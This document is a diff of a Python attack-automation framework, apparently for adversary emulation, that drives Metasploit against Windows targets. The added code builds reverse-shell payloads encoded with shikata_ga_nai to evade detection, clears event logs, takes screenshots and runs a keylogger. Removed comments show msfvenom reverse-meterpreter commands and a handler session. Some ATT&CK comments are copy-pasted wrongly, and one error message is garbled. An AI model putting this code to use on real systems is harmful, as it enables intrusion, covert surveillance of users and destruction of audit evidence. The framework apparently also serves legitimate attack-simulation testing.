@@ -202,11 +202,14 @@ class Metasploit():
                 1)
             venom = MSFVenom(self.attacker, target, self.attack_logger)
             venom.generate_and_deploy(payload=payload_type,
-                                      architecture="x64",
+                                      architecture="x86",
                                       platform="windows",
                                       lhost=self.attacker.get_ip(),
                                       format="exe",
-                                      outfile=payload_name)
+                                      outfile=payload_name,
+                                      encoder="x86/shikata_ga_nai",
+                                      iterations=5
+                                      )
             self.attack_logger.vprint(
                 f"{CommandlineColors.OKCYAN}Execute {payload_name} replacement - waiting for meterpreter shell{CommandlineColors.ENDC}",
                 1)
@@ -231,69 +234,59 @@ class MSFVenom():
         self.target = target
         self.attack_logger = attack_logger
 
-    def generate_cmd(self, **kwargs):
-        """ Generates a cmd
+    def generate_payload(self, **kwargs):
+        """ Generates a payload on the attacker machine
 
-
-        :return:
         """
         payload = kwargs.get("payload", None)
         architecture = kwargs.get("architecture", None)
         platform = kwargs.get("platform", self.target.get_os())
         lhost = kwargs.get("lhost", self.attacker.get_ip())
-        format = kwargs.get("format", None)  # file format
+        file_format = kwargs.get("format", None)  # file format
         outfile = kwargs.get("outfile", "payload.exe")
+        encoder = kwargs.get("encoder", None)
+        iterations = kwargs.get("iterations", None)
 
         cmd = "msfvenom"
         if architecture is not None:
+            if architecture not in ["x86", "x64"]:
+                raise MetasploitError(f"MSFVenom wrapper does not support architecture {architecture}")
             cmd += f" -a {architecture}"
         if platform is not None:
+            if platform not in ["windows", "linux"]:
+                raise MetasploitError(f"MSFVenom wrapper does not support platform {platform}")
             cmd += f" --platform {platform}"
         if payload is not None:
             cmd += f" -p {payload}"
         if lhost is not None:
             cmd += f" LHOST={lhost}"
-        if format is not None:
-            cmd += f" -f {format}"
+        if file_format is not None:
+            cmd += f" -f {file_format}"
         if outfile is not None:
             cmd += f" -o {outfile}"
+        if encoder is not None:
+            if encoder not in ["x86/shikata_ga_nai"]:
+                raise MetasploitError(f"MSFVenom wrapper does not support encoder {encoder}")
+            cmd += f" -e {encoder}"
+        if iterations is not None:
+            cmd += f" -i {iterations}"
 
-        # -p payload  linux/x86/meterpreter_reverse_tcp
-        # -f format: elf, exe, powershell, python
-        # --platform: linux, windows, osx
-        # -a arch: x86, x64
-        # -e encoders: x86/shikata_ga_nai
-        # -b bad chars to avoid
-        # -i iterations. encoding iterations
-        # -o <filename> out filename
-        # root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
-        # complex: msfvenom -a x86 --platform linux -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.178.125 -e x86/shikata_ga_nai -i 3 -f elf -o reverse_meterpreter
+        # Detecting all the mistakes that already have been made. To be continued
+        # Check if encoder supports the architecture
+        if encoder=="x86/shikata_ga_nai" and architecture=="x64":
+            raise MetasploitError(f"Encoder {encoder} does not support 64 bit architecture")
 
-        # verified to work (Linux): msfvenom -a x64 --platform linux -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.178.125  -f elf -o reverse_meterpreter
+        # Check if payload is for the right amount of bit
+        if architecture == "x64" and "/x64/" not in payload:
+            raise MetasploitError(f"Payload {payload} does not support 64 bit architecture")
+        if architecture == "x86" and "/x64/" in payload:
+            raise MetasploitError(f"Payload {payload} does not support 32 bit architecture")
 
-        # Keep in mind: The msfconsole needs to actively listen to the connection:
-        # msf6 > use exploit/multi/handler
-        # [*] Using configured payload generic/shell_reverse_tcp
-        # msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
-        # payload => linux/x64/meterpreter_reverse_tcp
-        # msf6 exploit(multi/handler) > set lhost 192.168.178.125
-        # lhost => 192.168.178.125
-        # msf6 exploit(multi/handler) > set lport 4444
-        # lport => 4444
-        # msf6 exploit(multi/handler) > run
-        #
-        # [*] Started reverse TCP handler on 192.168.178.125:4444
-        # [*] Meterpreter session 1 opened (192.168.178.125:4444 -> 192.168.178.125:42436) at 2021-06-01 03:32:12 -0400
-        #
-        # meterpreter >   !!! We are in the session now !!!
+        # Check if payload is platform
+        if platform not in payload:
+            raise MetasploitError(f"Payload {payload} support platform {platform}")
 
-        return cmd
-
-    def generate_payload(self, **kwargs):
-        """ Generates a payload on the attacker machine
-
-        """
-        cmd = self.generate_cmd(**kwargs)
+        # Footnote: Currently we only support windows/linux and the "boring" payloads. This will be more tricky as soon as we get creative here
 
         self.attacker.remote_run(cmd)
 
@@ -404,7 +397,7 @@ class MetasploitInstant(Metasploit):
         if user is not None:
             res = [item for item in res if item["User"] == user]
         if name is not None:
-            res = [item for item in res if item["Name"] == name]
+            res = [item for item in res if item["Name"].lower() == name.lower()]
         if arch is not None:
             res = [item for item in res if item["Arch"] == arch]
         return res
@@ -446,6 +439,7 @@ class MetasploitInstant(Metasploit):
         filtered_list = self.filter_ps_results(ps, user, name, arch)
 
         if len(filtered_list) == 0:
+            print(process_list)
             raise MetasploitError("Did not find a matching process to migrate to")
 
         # picking random target process
@@ -500,6 +494,86 @@ class MetasploitInstant(Metasploit):
                                                    metasploit_command=command,
                                                    ttp=ttp)
         res = self.meterpreter_execute_on([command], target)
+        print(res)
+        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
+                                                  target=target.get_ip(),
+                                                  metasploit_command=command,
+                                                  ttp=ttp)
+        return res
+
+    def clearev(self, target):
+        """ Clears windows event logs """
+
+        command = "clearev"
+        ttp = "T1070.001"   # It uses one out of three different ways to elevate privileges.
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
+
+        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                   target=target.get_ip(),
+                                                   metasploit_command=command,
+                                                   ttp=ttp)
+        res = self.meterpreter_execute_on([command], target)
+        print(res)
+        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
+                                                  target=target.get_ip(),
+                                                  metasploit_command=command,
+                                                  ttp=ttp)
+        return res
+
+    def screengrab(self, target):
+        """ Creates a screenshot
+
+        Before using it, migrate to a process running while you want to monitor.
+        One with the permission "NT AUTHORITY\SYSTEM"
+        """
+
+        command = "screengrab"
+        ttp = "T1113"   # It uses one out of three different ways to elevate privileges.
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
+
+        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                   target=target.get_ip(),
+                                                   metasploit_command=command,
+                                                   ttp=ttp)
+        res = self.meterpreter_execute_on(["use espia"], target)
+        print(res)
+        res = self.meterpreter_execute_on([command], target)
+        print(res)
+        self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
+                                                  target=target.get_ip(),
+                                                  metasploit_command=command,
+                                                  ttp=ttp)
+        return res
+
+    def keylogging(self, target, monitoring_time):
+        """ Starts keylogging
+
+        Before using it, migrate to a process running while you want to monitor.
+
+        "winlogon.exe" will monitor user logins. "explorer.exe" during the session.
+
+        @param monitoring_time: Seconds the keylogger is running
+        @param monitoring_time: The time to monitor the keys. In seconds
+        """
+
+        command = "keyscan_start"
+        ttp = "T1056.001"   # It uses one out of three different ways to elevate privileges.
+
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute {command} through meterpreter{CommandlineColors.ENDC}", 1)
+
+        self.attack_logger.start_metasploit_attack(source=self.attacker.get_ip(),
+                                                   target=target.get_ip(),
+                                                   metasploit_command=command,
+                                                   ttp=ttp)
+        res = self.meterpreter_execute_on([command], target)
+        print(res)
+        time.sleep(monitoring_time)
+        res = self.meterpreter_execute_on(["keyscan_dump"], target)
         print(res)
         self.attack_logger.stop_metasploit_attack(source=self.attacker.get_ip(),
                                                   target=target.get_ip(),
